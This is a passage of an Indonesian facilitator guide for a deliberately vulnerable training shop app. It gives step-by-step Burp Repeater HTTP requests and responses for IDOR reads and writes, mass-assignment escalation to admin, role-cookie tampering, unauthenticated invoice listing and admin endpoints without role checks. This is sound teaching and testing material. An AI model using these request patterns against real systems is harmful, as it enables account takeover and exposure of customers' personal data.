# FACILITATOR — Beyond Authentication: Exploiting Broken Access Control

Panduan operasional untuk menjalankan lab **Nusa Supply** pada seminar
**“Beyond Authentication: Exploiting Broken Access Control”**.

> **Intentionally vulnerable training lab. Data fiktif. Jangan deploy ke publik.**

Dokumen ini ditulis terhadap aplikasi yang **ada di folder ini**, bukan terhadap
versi ideal. Build saat ini hanya punya perilaku **VULN**: tidak ada flag
runtime untuk mengaktifkan mode aman. Perilaku aman ditunjukkan lewat komentar
`// FIX:` dan
[`docs/remediation.md`](remediation.md), bukan dengan mengganti mode server.

Asumsi pemetaan sesi (slide tidak disertakan di repo):

- **Demo 02** — recon: endpoint tersembunyi, OpenAPI parsial, bundle/sourcemap,
  panel admin yang hanya disembunyikan di UI, dan kontrol negatif.
- **Demo 03** — IDOR/BOLA horizontal: baca/tulis objek milik pelanggan lain.
- **Demo 04** — vertical: BFLA, mass assignment, role/cookie, two-step
  escalation, dan remediation.

Jika urutan slide Anda berbeda, pindahkan label Demo-nya; isi request dan bukti
tetap sama.

---

## 0. Ringkasan yang harus diketahui fasilitator

| Aspek | Nilai |
|---|---|
| Runtime yang diuji | Node.js 24.22.0, Linux |
| Port default | `127.0.0.1:3000` |
| Data | In-memory; restart = reset seluruh seed |
| Auth | JWT HS256, secret acak per proses, berlaku 2 jam |
| Akun attacker pada dokumen ini | hasil registrasi `auditor01` (customer), kecuali disebut lain |
| Akun korban utama | `bob` (1002), `dian` (2001), `alice` (1001), seller 8001/8002 |
| Kontrol negatif | `GET /api/admin/audit-log` selalu 403 untuk non-admin |
| Reset | tidak ada endpoint HTTP; hentikan server lalu `npm start` |

Jumlah skenario di dokumen ini: **36**. Rinciannya:

- **32 skenario** berupa request yang benar-benar berhasil dieksploitasi pada
  build ini.
- **4 skenario** berupa ketiadaan endpoint persis seperti yang diminta
  (riwayat transaksi per-user, balas tiket, ubah status user, method override).
  Untuk keempatnya, dokumen tetap menunjukkan request pembuktian dan hasil
  aktual, bukan mengarang endpoint.

Semua status dan body di bawah dicatat dari respons server lokal pada
2026-11-18. Angka `count` dapat berubah jika Anda sudah membuat akun, order,
atau dokumen tambahan; gunakan nilai relatif dan ID dari respons.

---

## 1. Setup fasilitator

### 1.1 Jalankan aplikasi

```bash
npm install
npm run build
npm test          # opsional, tetapi lakukan sebelum seminar
npm start         # http://127.0.0.1:3000
```

Jika port 3000 dipakai:

```bash
PORT=3100 npm start
```

Semua contoh memakai `127.0.0.1:3000`. Jika memakai port lain, ganti `Host`
dan URL secara konsisten.

Banner console harus muncul:

```text
Intentionally vulnerable training lab. Data fiktif. Jangan deploy ke publik.
http://127.0.0.1:3000
```

### 1.2 Burp Suite dan browser

Gunakan **browser bawaan Burp** (Proxy → Intercept → Open Browser). Browser
tersebut sudah diarahkan ke proxy Burp, sehingga request `127.0.0.1` terlihat di
**Proxy → HTTP history**.

- Untuk request baca: biarkan **Intercept off**; ambil request dari HTTP history.
- Untuk request yang diubah: klik kanan request → **Send to Repeater**.
- Jangan lupa menyalin nilai `Authorization` yang baru setelah registrasi/login.
- Jika memakai Firefox biasa dan request localhost tidak muncul, buka
  `about:config` lalu set `network.proxy.allow_hijacking_localhost = true`.
  Solusi yang paling sedikit variabel adalah browser bawaan Burp.

### 1.3 Registrasi akun attacker

Lakukan sekali per sesi server. Restart server menghapus akun ini.

1. Buka `http://127.0.0.1:3000/register`.
2. Isi:

   | Field | Nilai |
   |---|---|
   | Username | `auditor01` |
   | Nama | `Audit User` |
   | Email | `auditor01@example.test` |
   | Telepon | `0812-9999-0001` |
   | Password | `Rahasia123!` |

3. Submit. Request yang terlihat:

```http
POST /api/auth/register HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"username":"auditor01","name":"Audit User","email":"auditor01@example.test","phone":"0812-9999-0001","password":"Rahasia123!"}
```

Respons aktual: `201`, body memuat `token`, `tokenType`, `expiresIn`, dan
`user`. Akun baru selalu `role: "customer"`. ID pertama yang tersedia biasanya
`1003`; gunakan nilai `user.id` dari respons, bukan menebak.

Jika username sudah dipakai (`409`), restart server atau ganti username.

### 1.4 Ambil dan validasi token

Cara paling mudah:

1. Di HTTP history, buka request `POST /api/auth/register` atau
   `POST /api/auth/login`.
2. Pada tab **Response**, salin nilai `token` (bukan token contoh).
3. Di Repeater, kirim request berikut:

```http
GET /api/users/me HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

Respons yang harus terlihat:

```json
{
  "user": {
    "id": 1003,
    "username": "auditor01",
    "role": "customer",
    "status": "active"
  }
}
```

Jika `id` bukan akun attacker, atau `role` sudah berubah karena skenario
sebelumnya, **jangan lanjut** memakai token itu. Restart server dan registrasi
ulang.

### 1.5 Aturan reset dan token

- Skenario yang mengubah state: alamat, order, role, user, cookie settings,
  produk, cart/checkout, upload dokumen.
- Restart server setelah skenario yang mengubah state, sebelum skenario yang
  membutuhkan kondisi seed.
- Token lama otomatis tidak valid setelah restart karena JWT secret dibuat ulang.
- Jangan memakai token admin seed (`admin`) untuk skenario customer. Itu akan
  menghasilkan false positive.
- Jangan mengandalkan token dari dokumen ini; selalu salin token dari sesi
  browser yang sedang aktif.

### 1.6 ID seed yang dipakai

| Objek | ID | Pemilik |
|---|---|---|
| User alice | 1001 | customer |
| User bob | 1002 | customer (korban utama) |
| User dian | 2001 | customer (korban delete) |
| Seller Alpha | 8001 | seller |
| Seller Bravo | 8002 | seller |
| Admin | 9001 | admin |
| Order | 5001 | alice |
| Order | 5002 | bob |
| Order | 5003 | dian |
| Invoice | 7002 | bob |
| Ticket | 4002 | bob |
| Address | 3002 | bob |
| Document | 1 | folder Alpha (8001) |
| Document | 2 | folder Bravo (8002) |
| Document | 3 | alice |
| Employee GUID | `3f2b8c1e-5a4d-4f7a-9b2e-7c1d0a6f8e21` | Andi/Alpha |
| Employee GUID | `8c4d2a70-1b9e-4c3f-a6d5-2e7f9b0c1a34` | Maya/Bravo |
| Employee GUID | `d91e6b52-7c08-4a1f-8e43-5b2c9d7a0f68` | Rani/admin |

Order, invoice, ticket, dan dokumen baru memakai ID berikutnya dari `max + 1`.
Karena itu, jangan hardcode ID order baru; ambil dari respons.

### 1.7 Format langkah tiap skenario

Setiap skenario memakai urutan yang sama:

1. **Setup** — kondisi server, akun, token.
2. **UI** — halaman/aksi yang memicu request, atau alasan endpoint tidak
   ditautkan di UI.
3. **Burp** — dari mana request diambil dan apa yang diubah.
4. **Repeater/request** — request mentah yang diuji.
5. **Expected** — respons yang seharusnya jika otorisasi benar.
6. **Actual** — respons build ini.
7. **Validasi** — request kedua atau perubahan state yang membuktikan dampak.
8. **Dampak/debugging** — dampak konkret dan kesalahan umum.

“Expected” di sini adalah perilaku yang benar secara otorisasi, bukan perilaku
yang dijanjikan build VULN-only.

---

## 2. Account & Profile

### A1 — IDOR baca profil lewat path

**Demo:** 03 · **Hands-on:** IDOR dasar · **State:** read-only

**1. Setup.** Registrasi `auditor01` seperti §1.3. Cek `GET /api/users/me` dan
pastikan `role: "customer"`.

**2. UI.** Buka menu **Profil**. UI hanya meminta profil sendiri
(`GET /api/users/me`). Request IDOR tidak ada di UI; endpoint-nya terlihat di
bundle atau `/openapi.json`.

**3. Burp.** Ambil request `GET /api/users/me` dari HTTP history, kirim ke
Repeater, lalu ganti path. Jangan memakai token bob; token tetap milik attacker.

**4. Repeater.**

```http
GET /api/users/1002/profile HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403` karena user 1002 bukan pemilik token dan attacker bukan
admin.

**6. Actual.** `200`:

```json
{
  "user": {
    "id": 1002,
    "username": "bob",
    "name": "Bob Santoso",
    "email": "bob@example.test",
    "phone": "0813-2200-1002",
    "role": "customer",
    "status": "active",
    "loyaltyTier": "Gold",
    "joinedAt": "2022-11-02"
  }
}
```

**7. Validasi.** Ulangi dengan `GET /api/users/2001/profile`; hasilnya `200`
untuk dian. Lalu `GET /api/users/9999/profile`; hasilnya `404` (bukan `403`),
yang membedakan “tidak ada” dari “tidak boleh”.

**8. Dampak/debugging.** Attacker dapat membaca email, telepon, status, dan
loyalty tier pelanggan lain dengan ID berurutan. Ini bukan sekadar nama publik:
email dan telepon cukup untuk phishing atau pengambilalihan akun melalui
layanan lain. Jika mendapat `401`, token hilang/kedaluwarsa; jika `404`, ID
salah atau server baru di-restart.

---

### A2 — IDOR + sensitive field disclosure lewat query alias

**Demo:** 02 (recon) + 03 · **Hands-on:** IDOR alternatif · **State:** read-only

**1. Setup.** Sama seperti A1. Pastikan token masih customer.

**2. UI.** Endpoint `GET /api/users/profile` tidak ditautkan di UI. Temukan
path-nya dari sourcemap (`client/src/api.js` atau halaman Profil) atau dari
`/openapi.json`; jalankan lewat Repeater.

**3. Burp.** Mulai dari `GET /api/users/me`, kirim ke Repeater, ubah path dan
tambahkan query.

**4. Repeater.**

```http
GET /api/users/profile?userId=9001 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403` untuk user selain diri sendiri; query tidak boleh menjadi
cara memilih pemilik objek.

**6. Actual.** `200` dengan profil admin:

```json
{
  "user": {
    "id": 9001,
    "username": "admin",
    "name": "Rani Kusnadi",
    "email": "rani.ops@example.test",
    "phone": "021-555-9001",
    "role": "admin",
    "status": "active",
    "loyaltyTier": "Staff"
  }
}
```

Field `email`, `phone`, `status`, dan `loyaltyTier` adalah data profil yang
seharusnya tidak dikirim ke customer lain. Inilah bukti *sensitive field
disclosure* pada modul Account; tidak ada endpoint terpisah untuk field ini.

**7. Validasi.** Ganti `userId=1002`; hasilnya `200` untuk bob. Hapus query
(`/api/users/profile`) dan hasilnya `200` hanya untuk diri sendiri. Perbedaan
ini membuktikan query adalah parameter otorisasi yang salah.

**8. Dampak/debugging.** Attacker dapat memilih user mana pun, termasuk admin,
tanpa mengubah token. Jika `400`, `userId` bukan angka; jika `401`, token
bermasalah. Jangan menyimpulkan “tidak ada IDOR” hanya karena UI tidak
menampilkan field ini.

---

### A3 — Mass assignment: `role` dari body

**Demo:** 04 · **Hands-on:** privilege escalation · **State:** mengubah role

**1. Setup.** Registrasi baru. Cek `GET /api/users/me`; role harus
`customer`. Jangan lanjut jika sudah `admin`.

**2. UI.** Buka **Profil**, ubah nama atau telepon, submit. Request yang
dipicu adalah `PATCH /api/users/me`. UI tidak menyediakan field role, tetapi
body dapat diubah di Burp.

**3. Burp.** Ambil `PATCH /api/users/me` dari HTTP history; kirim ke Repeater.
Tambahkan `"role":"admin"` ke body.

**4. Repeater.**

```http
PATCH /api/users/me HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"role":"admin"}
```

**5. Expected.** Field `role` diabaikan; role tetap `customer` atau request
ditolak `400`. Respons tidak boleh menjadikan pemanggil admin.

**6. Actual.** `200` dan body menunjukkan role baru:

```json
{"user":{"id":1003,"username":"auditor01","role":"admin", "...": "..."}}
```

**7. Validasi.**

```http
GET /api/users/me HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

Respons kedua juga `role: "admin"`. Lanjutkan dengan
`GET /api/admin/users`; hasilnya `200`, bukan `403`. Ini membuktikan eskalasi
bukan hanya perubahan tampilan.

**8. Dampak/debugging.** Customer dapat memberi dirinya akses administratif
tanpa persetujuan. Dua bug terlibat: field `role` diterima dari body, dan
endpoint admin tidak memeriksa role. Memperbaiki salah satu saja tidak cukup.
Restart server setelah skenario ini sebelum menguji skenario customer lain.

---

### A4 — Cookie role yang dikontrol klien

**Demo:** 04 · **Hands-on:** client-controlled authorization · **State:** mengubah settings

**1. Setup.** Registrasi baru atau restart setelah A3. Pastikan
`GET /api/users/me` masih `customer`. Login/registrasi memberi
`Set-Cookie: role=customer`.

**2. UI.** Endpoint `/api/admin/settings` tidak ada di menu customer. Temukan
path dari bundle/sourcemap atau `/openapi.json`; tidak perlu menebak.

**3. Burp.** Ambil request `GET /api/admin/settings` (bisa dibuat dari Repeater),
lalu ubah header `Cookie`. Jangan mengubah token.

**4. Repeater — kontrol dan serangan.**

Pertama, buktikan cookie asli ditolak:

```http
GET /api/admin/settings HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=customer
Accept: application/json
```

Expected dan actual: `403` dengan pesan role sesi tidak diizinkan.

Lalu ganti nilai cookie:

```http
GET /api/admin/settings HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=admin
Accept: application/json
```

**5. Expected.** `403`; role harus diambil dari akun hasil verifikasi token,
bukan dari cookie yang bisa diubah.

**6. Actual.** `200`:

```json
{"settings":{"maintenanceMode":false,"allowRegistration":true,"taxRate":0,"supportEmail":"bantuan@nusa.example"}}
```

**7. Validasi.** Ubah settings:

```http
PATCH /api/admin/settings HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=admin
Content-Type: application/json

{"supportEmail":"audit@example.test"}
```

Respons `200` dan `supportEmail` berubah. Ulangi `GET` dengan cookie
`role=customer`; kembali `403`. Ini membuktikan cookie, bukan token, yang
menentukan.

**8. Dampak/debugging.** Customer dapat mengubah konfigurasi operasional
(maintenance, registrasi, email dukungan). Cookie tidak ditandatangani dan tidak
terikat ke user. Jika `403` muncul pada request dengan `role=admin`, cek apakah
header `Cookie` benar-benar terkirim dan tidak ada cookie lain yang menimpa.

---
## 3. Address

### K1 — IDOR baca dan tulis alamat (path + body `id`)

**Demo:** 03 · **Hands-on:** IDOR tulis · **State:** mengubah alamat bob

**1. Setup.** Registrasi `auditor01`; cek token `customer`. Jangan memakai
token bob. Alamat seed bob adalah `3002`.

**2. UI.** Buka **Alamat**. UI memuat alamat milik sendiri lewat
`GET /api/addresses/3001` (atau ID milik attacker), lalu menyimpan lewat
`PATCH /api/addresses/:id`. UI tidak menampilkan alamat bob; path harus diubah
di Burp.

**3. Burp.** Ambil `PATCH /api/addresses/<ID_MILIK_ATTACKER>` dari HTTP
history, kirim ke Repeater. Ganti path ke `3002`. Body tetap berisi field alamat;
`id` di body **tidak** menentukan target.

**4. Repeater — baca.**

```http
GET /api/addresses/3002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

Expected: `403`. Actual: `200`; body memuat alamat bob (`recipient`,
`phone`, `line1`, `city`, `postalCode`), bukan alamat attacker.

**5. Repeater — tulis.**

```http
PATCH /api/addresses/3002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"id":3002,"recipient":"Audit User","phone":"0812-9999-0001","line1":"Jl. Audit No. 1","city":"Jakarta Selatan","postalCode":"12930"}
```

**6. Expected.** `403` karena alamat 3002 bukan milik token. Bahkan jika body
memuat `id` yang sama, kepemilikan harus dicek dari path dan token.

**7. Actual.** `200`; field alamat berubah. Buktikan dengan:

```http
GET /api/orders/5002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

Objek `address` pada order bob sekarang menampilkan `recipient: "Audit User"`
dan telepon attacker. Ini membuktikan perubahan mengenai order nyata, bukan
salinan.

**8. Dampak/debugging.** Attacker dapat mengalihkan pengiriman atau mengubah
data kontak pelanggan. `id` di body sengaja dipertahankan untuk menunjukkan
bahwa parameter itu tidak boleh dipercaya; target tetap path. Jika `404`,
alamat tidak ada atau server baru di-restart; jika `400`, field wajib kurang.
Restart server setelah skenario ini.

---

## 4. Orders

### B1 — IDOR baca order

**Demo:** 03 · **Hands-on:** BOLA · **State:** read-only

**1. Setup.** Registrasi `auditor01`; role `customer`. Order 5002 milik bob.

**2. UI.** Buka **Order** atau dashboard. Attacker baru tidak punya order,
sehingga daftar kosong. Endpoint detail tetap ada di bundle:
`GET /api/orders/:id`. Request ini tidak bisa dipicu dari UI attacker karena
tidak ada tombol untuk order bob.

**3. Burp.** Ambil `GET /api/orders` (daftar) dari HTTP history, kirim ke
Repeater, ubah path menjadi `/api/orders/5002`.

**4. Repeater.**

```http
GET /api/orders/5002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403` karena order bukan milik attacker. `404` juga dapat
diterima sebagai desain anti-enumerasi, tetapi build ini memakai `403` untuk
objek yang ada.

**6. Actual.** `200` dengan data order bob:

```json
{
  "order": {
    "id": 5002,
    "userId": 1002,
    "addressId": 3002,
    "status": "Diproses",
    "paymentStatus": "paid",
    "placedAt": "2026-11-02T04:15:00Z",
    "courier": "SiCepat",
    "trackingNumber": "SC-5510-7781",
    "items": [
      {"productId": 104, "sku": "MA-DUAL", "name": "Monitor arm dual", "qty": 1, "price": 549000},
      {"productId": 105, "sku": "HUB-7IN1", "name": "USB-C hub 7-in-1", "qty": 1, "price": 389000}
    ],
    "total": 938000
  },
  "address": {
    "id": 3002,
    "userId": 1002,
    "label": "Kantor",
    "recipient": "Bob Santoso",
    "line1": "Jl. Gatot Subroto Kav. 21, Lantai 9",
    "city": "Jakarta Selatan",
    "postalCode": "12930",
    "phone": "0813-2200-1002"
  }
}
```

**7. Validasi.** `GET /api/orders/5001` juga `200` (order alice), sedangkan
`GET /api/orders/9999` `404`. Attacker tidak memiliki order apa pun, sehingga
setiap `200` di luar order-nya adalah bukti IDOR.

**8. Dampak/debugging.** Attacker melihat isi pesanan, alamat pengiriman, dan
nomor telepon bob. Jika `401`, token salah; jika `403` pada 5002, Anda mungkin
sudah menjalankan build yang berbeda atau memakai token bob. Jangan memakai
`GET /api/orders` sebagai bukti IDOR: endpoint itu memang memfilter berdasarkan
token.

---

### B2 — IDOR update status/order

**Demo:** 03 · **Hands-on:** IDOR tulis · **State:** mengubah order bob

**1. Setup.** Registrasi baru; role customer. Token attacker. Order 5002
awalnya `Diproses`.

**2. UI.** Buka detail order milik attacker sendiri (atau order baru dari cart
sesuai §J1). UI customer tidak menyediakan tombol ubah status. Endpoint
`PATCH /api/orders/:id` ada di bundle dan dipakai panel admin/seller; itulah
target recon.

**3. Burp.** Ambil request `PATCH /api/orders/:id` dari bundle/repeater, atau
buat manual. Ganti path ke `5002`. Body hanya berisi field yang ingin diubah.

**4. Repeater.**

```http
PATCH /api/orders/5002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"status":"Dibatalkan","courier":"Audit","trackingNumber":"AUDIT-1"}
```

**5. Expected.** `403`; customer tidak boleh mengubah status order orang lain.

**6. Actual.** `200`; body order menunjukkan `status: "Dibatalkan"`,
`courier: "Audit"`, dan `trackingNumber: "AUDIT-1"`.

**7. Validasi.** Ulangi `GET /api/orders/5002`; perubahan tetap ada. Cek juga
`GET /api/admin/orders` dengan token customer yang sudah dieskalasi (A3) atau
langsung lihat bahwa order 5002 kini dibatalkan. Attacker bukan pemilik 5002.

**8. Dampak/debugging.** Attacker dapat membatalkan, menandai selesai, atau
mengubah nomor resi order pelanggan. Dampaknya operasional dan finansial
(refund/fulfillment), bukan sekadar tampilan. Restart server setelah skenario
agar status seed kembali `Diproses`.

---

### B3 — Riwayat transaksi per user: tidak ada endpoint seperti itu

**Demo:** 02 + 04 · **Hands-on:** recon dan BFLA · **State:** read-only

**1. Setup.** Registrasi baru. Attacker tidak punya order.

**2. UI.** Menu **Order** memanggil `GET /api/orders`. Untuk akun baru hasilnya
`{"orders":[]}`. UI tidak menyediakan riwayat user lain.

**3. Burp.** Coba `/api/users/1002/orders`, `/api/orders?userId=1002`, dan
`/api/orders/user/1002`. Ketiganya tidak ada.

**4. Repeater — endpoint yang benar-benar ada.**

```http
GET /api/orders HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

Respons: `200` dengan daftar kosong (hanya order milik token). Ini **bukan**
IDOR; filter self sudah benar.

```http
GET /api/admin/orders HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403` untuk customer. Tidak ada endpoint riwayat per-user
yang boleh diakses customer.

**6. Actual.** `200`; body memuat **semua** order (8 pada seed), masing-masing
dengan `customer.email` dan `customer.phone`. Ini bukan IDOR per-user, tetapi
BFLA: endpoint admin global tanpa cek role.

**7. Validasi.** `GET /api/orders` tetap kosong/milik sendiri, sedangkan
`/api/admin/orders` berisi 5001, 5002, 5003, dan seterusnya. Perbedaan ini
penting agar tidak salah menyebut “IDOR riwayat transaksi” ketika yang bocor
adalah endpoint admin.

**8. Dampak/debugging.** Attacker dapat melihat seluruh transaksi dan kontak
pelanggan. Skenario persis “riwayat transaksi per user via IDOR” **tidak dapat
dibuktikan karena endpoint-nya tidak ada**; jangan mengarang hasil. Yang ada
adalah kebocoran global lewat BFLA, yang tetap dilaporkan dengan nama yang
benar.

---

## 5. Invoices

### C1 — IDOR invoice JSON

**Demo:** 03 · **Hands-on:** IDOR · **State:** read-only

**1. Setup.** Registrasi baru; attacker tidak punya invoice. Invoice 7002 milik
bob.

**2. UI.** Menu **Invoice** memanggil `GET /api/invoices` (hanya milik sendiri)
dan `GET /api/invoices/:id`. Attacker baru melihat daftar kosong. Detail
invoice bob tidak ditautkan; path ditemukan dari bundle.

**3. Burp.** Ambil `GET /api/invoices` dari HTTP history; kirim ke Repeater;
ubah path ke `/api/invoices/7002`.

**4. Repeater.**

```http
GET /api/invoices/7002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200`; body memuat invoice untuk `orderId: 5002`, pelanggan bob,
dan field finansial (`subtotal`, `tax`, `total`, `status`). Respons bukan
invoice milik attacker karena attacker belum punya invoice.

**7. Validasi.** `GET /api/invoices/7001` juga `200` (invoice alice);
`GET /api/invoices/9999` `404`. Ini membuktikan enumerasi ID.

**8. Dampak/debugging.** Data penagihan dan nominal pelanggan lain bocor.
Jangan gunakan invoice baru milik attacker sebagai bukti; pastikan ID yang
dibaca bukan milik token. Jika `404`, invoice tidak ada; jika `401`, token
hilang.

---

### C2 — IDOR download PDF invoice

**Demo:** 03 · **Hands-on:** IDOR file · **State:** read-only

**1. Setup.** Sama seperti C1. Invoice 7002 milik bob.

**2. UI.** Tombol **Unduh PDF** pada invoice milik sendiri memicu
`GET /api/invoices/:id/pdf`. Attacker tidak punya invoice, jadi request dibuat
manual dari pola URL.

**3. Burp.** Ambil request PDF milik attacker (jika ada) atau buat manual.
Kirim ke Repeater. Perhatikan bahwa respons bukan JSON.

**4. Repeater.**

```http
GET /api/invoices/7002/pdf HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/pdf
```

**5. Expected.** `403`.

**6. Actual.** `200` dengan header `Content-Type: application/pdf` dan body
dimulai `%PDF-1.4`. Di Burp, buka tab **Render** atau simpan body ke file. Isi
PDF memuat nama dan email bob.

**7. Validasi.** Simpan file lalu periksa teks yang tidak dikompresi:

```bash
curl -s -H "Authorization: Bearer <TOKEN_ATTACKER>" \
  http://127.0.0.1:3000/api/invoices/7002/pdf -o invoice-7002.pdf
strings invoice-7002.pdf | grep -E 'Bob Santoso|bob@example.test'
```

Output memuat `Bob Santoso` dan `bob@example.test`. Ini membuktikan isi file,
bukan hanya status `200`.

**8. Dampak/debugging.** Attacker dapat mengunduh dokumen penagihan pelanggan
lain. Jika `strings` kosong, PDF mungkin dikompresi; gunakan `pdftotext` atau
lihat di Burp Render. Jangan menyimpulkan aman hanya karena UI tidak
menampilkan tombol untuk invoice orang lain.

---

### C3 — Daftar invoice perusahaan tanpa autentikasi

**Demo:** 02 + 03 · **Hands-on:** missing authentication · **State:** read-only

**1. Setup.** Tidak perlu login. Ini justru inti temuan: endpoint tidak meminta
token.

**2. UI.** Tidak ada menu. Endpoint ditemukan dari `/openapi.json` atau
sourcemap. Buka langsung di browser boleh, tetapi bukti terbaik adalah request
tanpa header `Authorization`.

**3. Burp.** Kirim request berikut dari Repeater tanpa token. Hapus header
`Authorization` jika Burp menambahkannya otomatis.

**4. Repeater.**

```http
GET /api/company/invoices HTTP/1.1
Host: 127.0.0.1:3000
Accept: application/json
```

**5. Expected.** `401` karena tidak ada token.

**6. Actual.** `200` dengan daftar invoice perusahaan, termasuk `customer`
name, email, phone, dan total. Tidak ada pengecekan sesi sama sekali.

**7. Validasi.** Bandingkan dengan `GET /api/invoices` tanpa token, yang
seharusnya `401`. Endpoint company hanya punya route daftar; buktikan `count`
dan field `customer.email`/`customer.phone` pada setiap baris. Jangan mengarang
`GET /api/company/invoices/<ID>` karena route itu tidak ada.

**8. Dampak/debugging.** Siapa pun di jaringan lokal dapat membaca data
penagihan tanpa login. Ini bukan IDOR (tidak ada objek milik token), melainkan
missing authentication. Jangan mencampur nama keduanya di laporan.

---
## 6. Support Tickets

### D1 — IDOR baca tiket dan internal notes

**Demo:** 03 · **Hands-on:** IDOR + field sensitif · **State:** read-only

**1. Setup.** Registrasi baru; attacker tidak punya tiket. Tiket 4002 milik bob.

**2. UI.** Menu **Bantuan** memanggil `GET /api/tickets` (hanya tiket sendiri)
dan `GET /api/tickets/:id`. Attacker baru melihat daftar kosong. Detail tiket
bob tidak ada di UI.

**3. Burp.** Ambil `GET /api/tickets` dari HTTP history; kirim ke Repeater;
ubah path ke `/api/tickets/4002`.

**4. Repeater.**

```http
GET /api/tickets/4002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200`; body memuat tiket bob, `messages`, dan `internalNotes`.
Isi `internalNotes` menyebut email bob dan instruksi tim internal, misalnya:

```text
"Alamat baru sudah diduplikat oleh tim CS. Invoice revisi dikirim ulang ke
bob@example.test."
```

**7. Validasi.** `GET /api/tickets/4001` juga `200` (tiket alice). Periksa
bahwa `internalNotes` tidak pernah ditampilkan di UI customer; artinya field
ini memang data internal yang bocor lewat API, bukan data yang memang publik.

**8. Dampak/debugging.** Attacker membaca keluhan, email, dan catatan internal
CS pelanggan lain. Ini juga *sensitive field disclosure*. Jika `404`, tiket
tidak ada; jika `401`, token hilang.

---

### D2 — Alias tiket tanpa kontrol tambahan

**Demo:** 02 + 03 · **Hands-on:** recon alias · **State:** read-only

**1. Setup.** Sama seperti D1.

**2. UI.** UI memakai `/api/tickets`. Alias `/api/support/tickets` tidak
ditautkan. Temukan dari sourcemap atau `/openapi.json`.

**3. Burp.** Ubah path request D1, bukan token.

**4. Repeater.**

```http
GET /api/support/tickets/4002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`; alias harus memakai otorisasi yang sama.

**6. Actual.** `200` dengan data tiket bob yang sama seperti D1. Ini bukan
kerentanan baru, tetapi membuktikan bahwa alias tidak menambah kontrol dan
memperluas permukaan recon.

**7. Validasi.** Bandingkan body D1 dan D2; field kunci (`id`, `userId`,
`messages`, `internalNotes`) identik. `GET /api/support/tickets` tetap hanya
daftar milik token, jadi jangan menyebut alias ini “tanpa autentikasi”.

**8. Dampak/debugging.** Dampaknya sama dengan D1; nilai tambahnya untuk
materi recon adalah menunjukkan bahwa route duplikat sering lolos dari review.
Jika `404`, alias tidak terpasang di build ini; cek sourcemap, jangan mengarang.

---

### D3 — Balas tiket: endpoint tidak ada

**Demo:** 02 · **Hands-on:** recon negatif · **State:** tidak ada perubahan

**1. Setup.** Registrasi baru; token customer.

**2. UI.** Detail tiket tidak memiliki form balasan. UI hanya menampilkan
pesan. Tidak ada tombol yang memicu POST ke tiket.

**3. Burp.** Coba pola yang masuk akal:

```http
POST /api/tickets/4002/messages HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"message":"Balasan audit"}
```

**4. Repeater.** Kirim request di atas. Coba juga
`POST /api/tickets/4002/reply` dengan body yang sama.

**5. Expected.** Karena fitur tidak ada, `404` adalah hasil yang benar. Jangan
mengharapkan `403`; tidak ada route untuk diotorisasi.

**6. Actual.** `404` dengan pesan `{"error":"not_found"}`.

**7. Validasi.** Setelah POST, `GET /api/tickets/4002` tidak menunjukkan pesan
baru. Ini membuktikan tidak ada state yang berubah, bukan hanya status 404.

**8. Dampak/debugging.** Skenario “membalas tiket user lain” **tidak dapat
dibuktikan pada build ini karena endpoint balas tiket tidak tersedia**. Jangan
melaporkannya sebagai temuan. Jika Anda menambah endpoint di masa depan, uji
IDOR dengan token attacker dan tiket 4002.

---

## 7. User Administration

### E1 — Daftar seluruh user tanpa cek role

**Demo:** 04 · **Hands-on:** BFLA · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Jumlah user seed 6; setelah satu
registrasi menjadi 7.

**2. UI.** Menu **Operasional** tidak terlihat untuk customer. Panel admin ada
di bundle (`/admin`), tetapi tombol/menu disembunyikan di client. Ini hanya
UI-level hiding.

**3. Burp.** Ambil request mana pun yang terautentikasi, kirim ke Repeater,
ganti path ke `/api/admin/users`. Tidak perlu cookie admin.

**4. Repeater.**

```http
GET /api/admin/users HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200` dengan array semua user, termasuk `email`, `phone`,
`role`, `status`, dan `loyaltyTier`. Jumlah aktual 7 (6 seed + attacker).

**7. Validasi.** Cari `username: "admin"` dan `username: "bob"` di respons.
Keduanya bukan milik token attacker. Bandingkan dengan
